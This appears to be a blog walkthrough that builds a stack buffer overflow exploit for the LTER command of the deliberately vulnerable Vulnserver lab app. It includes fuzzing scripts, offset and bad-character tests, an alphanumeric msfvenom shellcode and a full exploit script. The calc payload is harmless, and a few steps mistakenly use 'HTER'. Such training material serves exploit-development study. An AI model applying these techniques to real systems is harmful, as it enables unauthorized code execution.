---
title: "Vulnserver LTER - Bypass Restricted Characters"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver LTER using encoders to bypass restricted characters"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Vulnserver LTER - Bypass restricted characters using Encoders](#vulnserver-lter---bypass-restricted-characters-using-encoders)
	- [Prologue](#prologue)
	- [Spiking the Vulnserver](#spiking-the-vulnserver)
	- [Analysing the source code](#analysing-the-source-code)
	- [Fuzzing the server](#fuzzing-the-server)
	- [Finding offset](#finding-offset)
	- [Overwriting Instruction Pointer](#overwriting-instruction-pointer)
	- [Finding bad characters](#finding-bad-characters)
	- [Redirecting the execution](#redirecting-the-execution)
	- [Generating shellcode](#generating-shellcode)
	- [Exploitation](#exploitation)

## Prologue

On last blog post we saw about basic ```Vanilla Stack Buffer Overflow``` with a special function converting our string into hex, where we overwrote the ```EIP``` to gain code execution

But in this post we will be exploiting a command in Vulnserver where we will be following the same exploitation, but we are going to face some ```restricted characters``` and use some ```encoders``` to bypass it

## Spiking the Vulnserver

Creating a ```spike script``` for spiking using ```generic_send_tcp```,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat lter.spk   
s_readline();
s_string("LTER ");
s_string_variable("0");

┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ generic_send_tcp 192.168.116.140 9999 lter.spk 0 0           
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=Welcome to Vulnerable Server! Enter HELP for help.
Fuzzing Variable 0:1
Variablesize= 5004
Fuzzing Variable 0:2
Variablesize= 5005

...

```

While spiking LTER command, we could see that we could not connect to the Vulnserver anymore

Yes.. It got crashed!!

We could see that our Vulnserver application has been terminated by ```Access Violation error```

From this we can confirm that, ```LTER``` command is vulnerable to Buffer Overflow attack

## Analysing the source code

The source code for this command is,

```c
} else if (strncmp(RecvBuf, "LTER ", 5) == 0) {
				char *LterBuf = malloc(DEFAULT_BUFLEN);
				memset(LterBuf, 0, DEFAULT_BUFLEN);
				i = 0;
				while(RecvBuf[i]) {
					// restricting characters
					if ((byte)RecvBuf[i] > 0x7f) {
						LterBuf[i] = (byte)RecvBuf[i] - 0x7f;
					} else {
						LterBuf[i] = RecvBuf[i];
					}
					i++;
				}
				for (i = 5; i < DEFAULT_BUFLEN; i++) {
					if ((char)LterBuf[i] == '.') {	
						// vulnerable function				
						Function3(LterBuf);
						break;
					}
				}
				memset(LterBuf, 0, DEFAULT_BUFLEN);
				SendResult = send( Client, "LTER COMPLETE\n", 14, 0 );
			}
```

Here we can see that characters greater than ```0x7f``` are getting converted as ```(byte)RecvBuf[i] - 0x7f```

This way, the code ```restricts``` characters above ```0x7f``` and converts it and stores it in memory

So it allows ```alpha-numeric``` characters only

After storing these, it invoke the vulnerable function ```Function3(LterBuf)```

The souce code of this vulnerable function is,

```c
void Function3(char *Input) {
	char Buffer2S[2000];	
	strcpy(Buffer2S, Input);
}
```

Here the main overflow attack is caused by ```strcpy``` function, where ```Buffer2S``` is only limited for 2000 bytes but the incoming buffer has more data than that causing it to overflow the Buffer2S buffer while copying

This command does expects ```"."``` character used for validation

## Fuzzing the server

We have successfully crashed our server and the payload data begins with ```LTER ./``` which is made up of ```7 bytes```

Lets create a python script which generates payload data and fuzzes the payload length to crash the server

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat fuzzing.py 
import socket, sys
from time import sleep
payload=b"A"*500
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.140", 9999))
        s.send((b"LTER ./"+payload))
        sleep(5)
        payload=payload+b"A"*500
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 fuzzing.py                                
Fuzzing crashed at 2500 bytes
```

The Vulnserver application should be ran without debugger, to avoid socket connection errors while fuzzing

So, from fuzzing we can estimate that our Vulnserver application is crashing at ```2500 bytes``` of buffer data

Still, we are not sure about the approximate buffer space data need to create an overflow

## Finding offset

By finding offset, we can locate the approximate buffer space size for writing data into the base pointer and instruction pointer

To find the offset, we need to create a pattern and crash the program

So that the value in the registers can be used to find the offset of it from buffer data

We could create a random pattern using ```metasploit``` and analyse it, because even though if we create and pass it into the buffer it will get converted into the same alpha numeric characters and it does not creare any issue for us to analyse the offset

Lets find it manually using python script used from our previous blog

Fuzzing with the our own pattern to crash the program,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat offset.py 
import socket, sys
# fuzzing for EIP offset
payload=b""
payload+=b"A"*1000
payload+=b"B"*1000
payload+=b"C"*100
payload+=b"D"*100
payload+=b"E"*100
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 offset.py 
```

This will crash the program, where our buffer will get overflowed and fills the Base Pointer and Instruction Pointer with the data from the pattern

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-offset-start.png">
</div>

Here we can see ```EIP``` has a data of ```CCCC```, which is from our payload

Still we need to pass our payloads precisely to hit the ```EIP``` to find its offset

After numerous tries, finally using this script we can overwrite the ```EBP``` and ```EIP``` with our own data

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat offset.py 
import socket, sys
payload=b""
# to overwrite buffer
payload+=b"A"*2001
# to overwrite EBP
payload+=b"B"*4
# to overwrite EIP
payload+=b"C"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 offset.py
```

We overwrote ```EBP``` and ```EIP``` with ```B's``` and ```C's```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-offset-final.png">
</div>

Now, using the data from the registers we are going to locate the offset in the buffer space to reach the data

In our payload we used,

```HTER ./``` - 7 bytes

```"A"s``` - 2001 bytes

```"B"s``` and ```"C"s``` - 4 bytes

Offset of ```EBP``` = 7 + 2001 = 2008 bytes

Offset of ```EIP``` = 7 + 2001 + 4 = Offset of EBP + 4 = 2012 bytes

So we should use 7 bytes of ```LTER ./``` and 2005 bytes of ```A's``` to reach ```EIP```

## Overwriting Instruction Pointer

Now, we have found the offset of our EIP

It’s time to control the EIP, which is the important phase of every exploitation

Lets craft a script to overwrite the EIP with our own custom data, which will be further used to craft an exploit,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat overwrite-eip.py    
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2005
# to overwrite EIP
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 overwrite-eip.py
```

We have successfully overwrote the ```EIP``` with our own data ```0x44444444```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-overwrite-reg.png">
</div>

So we could control EIP and redirect the code execution to the next point

## Finding bad characters

Lets fuzz our ```ESP``` memory to see our data dump on that region

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat fuzz-esp.py                
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2005
# to overwrite EIP
payload+=b"B"*4
# padding
payload+=b"D"*(2500-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 fuzz-esp.py 
```

After fuzzing, we can see our ESP data in the memory dump after EIP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-badchar-fuzzesp.png" style="width:40%">
</div>

Lets use it to test for ```bad characters```

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat badchars.py 
import socket, sys
# collection of bad characters except \x00
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2005
# to overwrite EIP
payload+=b"B"*4
# fuzzing badchars on ESP
payload+=badchars
# padding
payload+=b"D"*(2500-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 badchars.py 
```

We could see the characters less then ```0x7f``` is stored as it is, and above it are restricted and converted as shown in the code

Seems like, we can only pass ```alpha-numeric``` characters

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-badchars-esp.png" style="width:70%">
</div>

So characters above the hex value ```0x7f``` are considered as ```bad characters``` in this command

It is being ```mangled``` (being converted) in the stack memory

The list of bad characters are,

```c
>>> bad_chars=[]
>>> for x in range(0x80,0xff):
...     bad_chars.append(hex(x))
... 
>>> bad_chars.append(hex(255))
>>> bad_chars.append(hex(0))
>>> bad_chars
['0x80', '0x81', '0x82', '0x83', '0x84', '0x85', '0x86', '0x87', '0x88', '0x89', '0x8a', '0x8b', '0x8c', '0x8d', '0x8e', '0x8f', '0x90', '0x91', '0x92', '0x93', '0x94', '0x95', '0x96', '0x97', '0x98', '0x99', '0x9a', '0x9b', '0x9c', '0x9d', '0x9e', '0x9f', '0xa0', '0xa1', '0xa2', '0xa3', '0xa4', '0xa5', '0xa6', '0xa7', '0xa8', '0xa9', '0xaa', '0xab', '0xac', '0xad', '0xae', '0xaf', '0xb0', '0xb1', '0xb2', '0xb3', '0xb4', '0xb5', '0xb6', '0xb7', '0xb8', '0xb9', '0xba', '0xbb', '0xbc', '0xbd', '0xbe', '0xbf', '0xc0', '0xc1', '0xc2', '0xc3', '0xc4', '0xc5', '0xc6', '0xc7', '0xc8', '0xc9', '0xca', '0xcb', '0xcc', '0xcd', '0xce', '0xcf', '0xd0', '0xd1', '0xd2', '0xd3', '0xd4', '0xd5', '0xd6', '0xd7', '0xd8', '0xd9', '0xda', '0xdb', '0xdc', '0xdd', '0xde', '0xdf', '0xe0', '0xe1', '0xe2', '0xe3', '0xe4', '0xe5', '0xe6', '0xe7', '0xe8', '0xe9', '0xea', '0xeb', '0xec', '0xed', '0xee', '0xef', '0xf0', '0xf1', '0xf2', '0xf3', '0xf4', '0xf5', '0xf6', '0xf7', '0xf8', '0xf9', '0xfa', '0xfb', '0xfc', '0xfd', '0xfe', '0xff', '0x0']
```

Adding ```null byte``` and ```0xff``` to bad characters list

## Redirecting the execution

As for now, we can control the ```EIP``` and also we have a list of bad characters

Since we can control EIP, we can use this as our advantage and redirect the code flow to any part of the memory where it is perfect to have shellcode execution

After EIP, we would be having ESP

We know that, we could overflow ESP after EIP

But we don’t have execution, because EIP should be pointed to the address of ESP and the stack should allow execution

To make our shellcode from ESP to execute, we need to jump from the current location to address of ESP

This can be done by ```jmp esp```, all we have to do is point the EIP with the address of this instruction

Running mona by passing ```!mona modules``` command to list the protection of all modules used by this application

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-mona-modules.png">
</div>

On these, we can clearly see that only ```two modules``` have every security mitigations turned off

From these two, it is always best to try our exploit from an DLL of the own application and not from the actual exe itself

Lets find the jmp esp opcode from the memory of ```essfunc.dll```

To find the opcode using mona, we need the hex value of the opcode which can be done by ```nasm shell```

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
                                                                       
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > exit
```

Finding this offset using mona by the command ```!mona find -s \xff\xe4 -m essfunc.dll```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-mona-jmpesp.png">
</div>

We could see there are 9 pointers available for this exploit which has jmp esp opcode in it and it also doesn’t change its memory address

Eventhough ```ASLR``` is enabled for other parts, here it is disabled which makes the address to remain static & suitable for exploitation

```NX bit``` is also disabled, which allows us to execute shellcode on stack memory

Also, while checking the pointer addresses make sure that the address do not contain bad characters in it, which may cause poor exploitation

To find the ```suitable pointer address``` without restricted characters,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat find-bad-address.py   
bad_chars=['0x80', '0x81', '0x82', '0x83', '0x84', '0x85', '0x86', '0x87', '0x88', '0x89', '0x8a', '0x8b', '0x8c', '0x8d', '0x8e', '0x8f', '0x90', '0x91', '0x92', '0x93', '0x94', '0x95', '0x96', '0x97', '0x98', '0x99', '0x9a', '0x9b', '0x9c', '0x9d', '0x9e', '0x9f', '0xa0', '0xa1', '0xa2', '0xa3', '0xa4', '0xa5', '0xa6', '0xa7', '0xa8', '0xa9', '0xaa', '0xab', '0xac', '0xad', '0xae', '0xaf', '0xb0', '0xb1', '0xb2', '0xb3', '0xb4', '0xb5', '0xb6', '0xb7', '0xb8', '0xb9', '0xba', '0xbb', '0xbc', '0xbd', '0xbe', '0xbf', '0xc0', '0xc1', '0xc2', '0xc3', '0xc4', '0xc5', '0xc6', '0xc7', '0xc8', '0xc9', '0xca', '0xcb', '0xcc', '0xcd', '0xce', '0xcf', '0xd0', '0xd1', '0xd2', '0xd3', '0xd4', '0xd5', '0xd6', '0xd7', '0xd8', '0xd9', '0xda', '0xdb', '0xdc', '0xdd', '0xde', '0xdf', '0xe0', '0xe1', '0xe2', '0xe3', '0xe4', '0xe5', '0xe6', '0xe7', '0xe8', '0xe9', '0xea', '0xeb', '0xec', '0xed', '0xee', '0xef', '0xf0', '0xf1', '0xf2', '0xf3', '0xf4', '0xf5', '0xf6', '0xf7', '0xf8', '0xf9', '0xfa', '0xfb', '0xfc', '0xfd', '0xfe', '0xff', '0x0']
jmp_esp_pointers=['0x625011af','0x625011bb','0x625011c7','0x625011d3','0x625011df','0x625011eb','0x625011f7','0x62501203','0x62501205']
bad_pointers=[]
good_pointers=[]
bad_chars=[x[2:] for x in bad_chars]
for x in jmp_esp_pointers:
        byte_data=[x[2:4],x[4:6],x[6:8],x[8:]]
        for y in byte_data:
                if y in bad_chars:
                        print("Found bad char "+y+" in "+x)
                        bad_pointers.append(x)
bad_pointers=list(set(bad_pointers))
for x in bad_pointers:
        if x in jmp_esp_pointers:
                jmp_esp_pointers.remove(x)
good_pointers=jmp_esp_pointers
print("\nAvailable JMP ESP pointers without bad characters are")
print(good_pointers)
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 find-bad-address.py
Found bad char af in 0x625011af
Found bad char bb in 0x625011bb
Found bad char c7 in 0x625011c7
Found bad char d3 in 0x625011d3
Found bad char df in 0x625011df
Found bad char eb in 0x625011eb
Found bad char f7 in 0x625011f7

Available JMP ESP pointers without bad characters are
['0x62501203', '0x62501205']
```

So we found only 2 pointers without restricted characters

Lets craft the script and enter the address of the jmp esp opcode in ```little endian``` format because the data in stack is placed in little endian format

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat jmp-esp.py         
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2041
# to overwrite EIP with JMP ESP
payload+=b"\x03\x12\x50\x62"
# padding
payload+=b"D"*8
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 jmp-esp.py                         
```

After crashing, we can see that we landed perfectly on ESP memory leading to an illegal instruction error from ESP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/lter-jmpesp-esp.png" style="width:40%">
</div>

So, we have successfully redirected our program flow

Next we have to point it with our shellcode

## Generating shellcode

Here comes the important part of the exploitation, 

Since this command accepts only alpha numeric characters, we can use ```shellcode encoders``` to solve this problem

We can use ```x86/alpha_mixed``` encoder to create shellcode with mixed characters of lower case and upper case characters

Additional note refered from other blog,

*There is one thing to be aware of when using this encoder however – it is a Metasploit implementation of SkyLined’s (Berend-Jan Wevers) ALPHA2 encoder, which needs to know its position in memory in order to function. By default, if you don’t provide this information, the Metasploit implementation adds its own code to determine its position in memory to the start of the encoder, and this code is unfortunately not alphanumeric compatible. To work around this, we can provide a sparsely documented command line option “BufferRegister” to msfencode to specify a register that contains the position of the shellcode in memory. In this case, that register would be ESP, which contains the start address of our shellcode in this particular exploit*

Lets generate the shellcode to pop ```calc.exe``` using msfvenom,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f python BufferRegister=ESP -e x86/alpha_mixed
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 440 (iteration=0)
x86/alpha_mixed chosen with final size 440
Payload size: 440 bytes
Final size of python file: 2145 bytes
buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x39\x6c\x6d\x38\x6b\x32\x65\x50\x57\x70\x57\x70\x31"
buf += b"\x70\x4f\x79\x6a\x45\x76\x51\x39\x50\x63\x54\x4e\x6b"
buf += b"\x76\x30\x64\x70\x6e\x6b\x32\x72\x44\x4c\x4e\x6b\x30"
buf += b"\x52\x36\x74\x4e\x6b\x32\x52\x46\x48\x44\x4f\x78\x37"
buf += b"\x50\x4a\x35\x76\x74\x71\x69\x6f\x6e\x4c\x47\x4c\x43"
buf += b"\x51\x71\x6c\x66\x62\x56\x4c\x65\x70\x7a\x61\x7a\x6f"
buf += b"\x64\x4d\x65\x51\x39\x57\x79\x72\x4b\x42\x31\x42\x36"
buf += b"\x37\x6e\x6b\x56\x32\x56\x70\x4c\x4b\x32\x6a\x75\x6c"
buf += b"\x6c\x4b\x62\x6c\x44\x51\x30\x78\x6b\x53\x30\x48\x35"
buf += b"\x51\x4e\x31\x32\x71\x4e\x6b\x31\x49\x67\x50\x73\x31"
buf += b"\x6b\x63\x4e\x6b\x37\x39\x36\x78\x6d\x33\x77\x4a\x52"
buf += b"\x69\x4e\x6b\x54\x74\x4e\x6b\x76\x61\x49\x46\x56\x51"
buf += b"\x69\x6f\x6c\x6c\x6a\x61\x4a\x6f\x36\x6d\x35\x51\x58"
buf += b"\x47\x65\x68\x6b\x50\x62\x55\x59\x66\x73\x33\x31\x6d"
buf += b"\x7a\x58\x75\x6b\x31\x6d\x64\x64\x52\x55\x59\x74\x62"
buf += b"\x78\x4e\x6b\x62\x78\x44\x64\x73\x31\x4a\x73\x62\x46"
buf += b"\x4c\x4b\x54\x4c\x62\x6b\x6c\x4b\x52\x78\x77\x6c\x36"
buf += b"\x61\x38\x53\x4e\x6b\x47\x74\x6e\x6b\x45\x51\x4e\x30"
buf += b"\x4c\x49\x53\x74\x71\x34\x76\x44\x61\x4b\x73\x6b\x50"
buf += b"\x61\x33\x69\x53\x6a\x30\x51\x79\x6f\x6d\x30\x71\x4f"
buf += b"\x53\x6f\x32\x7a\x6c\x4b\x72\x32\x58\x6b\x4e\x6d\x73"
buf += b"\x6d\x51\x7a\x66\x61\x4c\x4d\x4b\x35\x4f\x42\x57\x70"
buf += b"\x45\x50\x73\x30\x76\x30\x50\x68\x64\x71\x6c\x4b\x62"
buf += b"\x4f\x4e\x67\x4b\x4f\x6b\x65\x6f\x4b\x7a\x50\x78\x35"
buf += b"\x4c\x62\x71\x46\x35\x38\x6f\x56\x6d\x45\x4f\x4d\x4d"
buf += b"\x4d\x4b\x4f\x6b\x65\x65\x6c\x74\x46\x63\x4c\x67\x7a"
buf += b"\x4f\x70\x39\x6b\x6b\x50\x50\x75\x36\x65\x4f\x4b\x67"
buf += b"\x37\x45\x43\x53\x42\x30\x6f\x72\x4a\x73\x30\x31\x43"
buf += b"\x39\x6f\x79\x45\x31\x73\x53\x51\x50\x6c\x75\x33\x74"
buf += b"\x6e\x32\x45\x70\x78\x32\x45\x57\x70\x41\x41"
```

## Exploitation

Now we have gone through every steps and crafted our final exploit to gain shell on our target machine

The exploit script for this buffer overflow via ```LTER``` command is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ cat exploit.py                                                 
import socket, sys

# shellcode
buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x39\x6c\x6d\x38\x6b\x32\x65\x50\x57\x70\x57\x70\x31"
buf += b"\x70\x4f\x79\x6a\x45\x76\x51\x39\x50\x63\x54\x4e\x6b"
buf += b"\x76\x30\x64\x70\x6e\x6b\x32\x72\x44\x4c\x4e\x6b\x30"
buf += b"\x52\x36\x74\x4e\x6b\x32\x52\x46\x48\x44\x4f\x78\x37"
buf += b"\x50\x4a\x35\x76\x74\x71\x69\x6f\x6e\x4c\x47\x4c\x43"
buf += b"\x51\x71\x6c\x66\x62\x56\x4c\x65\x70\x7a\x61\x7a\x6f"
buf += b"\x64\x4d\x65\x51\x39\x57\x79\x72\x4b\x42\x31\x42\x36"
buf += b"\x37\x6e\x6b\x56\x32\x56\x70\x4c\x4b\x32\x6a\x75\x6c"
buf += b"\x6c\x4b\x62\x6c\x44\x51\x30\x78\x6b\x53\x30\x48\x35"
buf += b"\x51\x4e\x31\x32\x71\x4e\x6b\x31\x49\x67\x50\x73\x31"
buf += b"\x6b\x63\x4e\x6b\x37\x39\x36\x78\x6d\x33\x77\x4a\x52"
buf += b"\x69\x4e\x6b\x54\x74\x4e\x6b\x76\x61\x49\x46\x56\x51"
buf += b"\x69\x6f\x6c\x6c\x6a\x61\x4a\x6f\x36\x6d\x35\x51\x58"
buf += b"\x47\x65\x68\x6b\x50\x62\x55\x59\x66\x73\x33\x31\x6d"
buf += b"\x7a\x58\x75\x6b\x31\x6d\x64\x64\x52\x55\x59\x74\x62"
buf += b"\x78\x4e\x6b\x62\x78\x44\x64\x73\x31\x4a\x73\x62\x46"
buf += b"\x4c\x4b\x54\x4c\x62\x6b\x6c\x4b\x52\x78\x77\x6c\x36"
buf += b"\x61\x38\x53\x4e\x6b\x47\x74\x6e\x6b\x45\x51\x4e\x30"
buf += b"\x4c\x49\x53\x74\x71\x34\x76\x44\x61\x4b\x73\x6b\x50"
buf += b"\x61\x33\x69\x53\x6a\x30\x51\x79\x6f\x6d\x30\x71\x4f"
buf += b"\x53\x6f\x32\x7a\x6c\x4b\x72\x32\x58\x6b\x4e\x6d\x73"
buf += b"\x6d\x51\x7a\x66\x61\x4c\x4d\x4b\x35\x4f\x42\x57\x70"
buf += b"\x45\x50\x73\x30\x76\x30\x50\x68\x64\x71\x6c\x4b\x62"
buf += b"\x4f\x4e\x67\x4b\x4f\x6b\x65\x6f\x4b\x7a\x50\x78\x35"
buf += b"\x4c\x62\x71\x46\x35\x38\x6f\x56\x6d\x45\x4f\x4d\x4d"
buf += b"\x4d\x4b\x4f\x6b\x65\x65\x6c\x74\x46\x63\x4c\x67\x7a"
buf += b"\x4f\x70\x39\x6b\x6b\x50\x50\x75\x36\x65\x4f\x4b\x67"
buf += b"\x37\x45\x43\x53\x42\x30\x6f\x72\x4a\x73\x30\x31\x43"
buf += b"\x39\x6f\x79\x45\x31\x73\x53\x51\x50\x6c\x75\x33\x74"
buf += b"\x6e\x32\x45\x70\x78\x32\x45\x57\x70\x41\x41"

payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2005
# to overwrite EIP with JMP ESP
payload+=b"\x03\x12\x50\x62"
# executing shellcode
payload+=buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/LTER]
└─$ python3 exploit.py                                            
```

By running this exploit, we would successfully pop a calculator by executing our shellcode

<video width="100%" preload="auto" muted controls>
    <source src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-exploit.mp4" type="video/mp4"/>
</video>
